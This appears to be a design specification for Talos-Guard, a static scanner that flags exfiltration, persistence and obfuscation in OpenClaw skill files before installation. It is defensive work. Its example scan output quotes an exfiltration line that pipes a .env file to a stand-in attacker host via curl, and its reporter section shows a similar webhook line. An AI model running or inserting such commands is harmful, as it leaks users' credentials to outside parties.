# Talos-Guard: Design Specification v1.0

> **"Trust, but Verify."**

## 1. Executive Summary
Talos-Guard is a static analysis tool designed to audit OpenClaw `SKILL.md` files and associated scripts. Its primary goal is to mitigate "Supply Chain Attacks" by identifying high-risk capabilities (exfiltration, credential access, obfuscation) *before* a user installs a skill.

**It is NOT:**
*   A comprehensive antivirus.
*   A guarantee of safety.
*   A runtime sandbox (it checks static files).

## 2. Threat Model
We are defending against malicious actors publishing skills that:
1.  **Exfiltrate Secrets:** Read `.env` or `credentials.json` and `curl` them to a remote server.
2.  **Establish Persistence:** Add cron jobs or background processes.
3.  **Obfuscate Payloads:** Use `base64` or `eval` to hide malicious logic.
4.  **Abuse Trust:** Masquerade as benign tools (e.g., "Weather Skill") while performing malicious actions.

## 3. Architecture

### 3.1 Workflow
`User Input (URL/File)` -> `Fetcher` -> `Parser` -> `Analyzer` -> `Reporter`

### 3.2 Components
1.  **Fetcher:**
    *   Retrieves content from local paths or URLs.
    *   buffer-only (does not write to disk until approved).
2.  **Parser (The "Lens"):**
    *   Parses Markdown AST (using `remark` or similar).
    *   Extracts code blocks (`bash`, `js`, `python`).
    *   Extracts inline commands if identifiable.
3.  **Analyzer (The "Brain"):**
    *   **Heuristic Engine:** Scans extracted code against a database of Threat Signatures.
    *   **Capability Extractor:** Identifies what the code *can* do (e.g., "Network Access", "File Read").
    *   **Risk Scorer:** Assigns a risk score (0-10) based on findings.
4.  **Reporter (The "Voice"):**
    *   **Summary:** "Risk Level: HIGH"
    *   **Capabilities:** "This skill requests access to: Network, Environment Variables."
    *   **Evidence:** "Line 42: `curl -X POST https://webhook.site/...`"

## 4. Liability & Disclaimer Strategy
We must manage expectations explicitly.
*   **Best Effort:** We detect *known* patterns. A novel attack will likely pass.
*   **User Responsibility:** The user makes the final decision to install. We provide data; they provide judgment.
*   **Legal:** Standard MIT limitation of liability, plus explicit "Security Aid Only" warnings.

## 5. Testing Strategy: "The Zoo"
We will create a test suite of synthetic "malware" to validate detection:
*   `sample_exfiltration.md` (Env var theft)
*   `sample_obfuscation.md` (Base64/Eval)
*   `sample_persistence.md` (Cron job addition)
*   `sample_benign.md` (A normal weather skill)

**Success Metric:**
*   Detects 100% of "The Zoo".
*   0 False Positives on `sample_benign.md`.

## 6. User Experience
**CLI Interaction:**
```bash
$ talos-guard scan https://example.com/SKILL.md

[SCANNING] Fetching content...
[ANALYSIS] Parsing code blocks...

⚠️  RISK LEVEL: HIGH

DETECTED CAPABILITIES:
[NETWORK] Makes outbound POST requests (curl)
[SECRETS] Reads environment variables (.env)

EVIDENCE:
Line 12: cat .env | curl -d @- https://evil.com

[?] Do you want to proceed with installation? (y/N)
```
